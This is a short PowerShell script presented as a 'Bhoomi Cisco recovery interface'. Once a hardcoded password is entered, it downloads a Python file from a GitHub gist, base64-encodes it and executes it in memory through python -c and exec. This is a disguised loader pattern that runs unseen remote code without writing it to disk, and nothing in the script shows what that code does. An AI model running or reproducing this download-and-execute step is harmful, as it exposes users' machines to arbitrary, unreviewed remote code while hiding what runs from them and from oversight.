# Force UTF-8 Encoding to fix the ruined ASCII art
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# BHOOMI REMOTE INTERFACE
Clear-Host
$C = [ConsoleColor]::Cyan

Write-Host "--- BHOOMI CISCO RECOVERY INTERFACE ---" -ForegroundColor $C
$pass = Read-Host "Enter Access Password"

if ($pass -eq "Dinesh") {
    Write-Host "[+] Authentication Successful. Fetching Engine..." -ForegroundColor Green
    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
    $code = (New-Object Net.WebClient).DownloadString($url)
    
    # Execute Python in RAM
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($code))
    # We also pass the UTF-8 flag to Python
    python -X utf8 -c "import base64; exec(base64.b64decode('$encoded').decode('utf-8'))"
} else {
    Write-Host "[-] Access Denied." -ForegroundColor Red
    Start-Sleep -Seconds 2
}
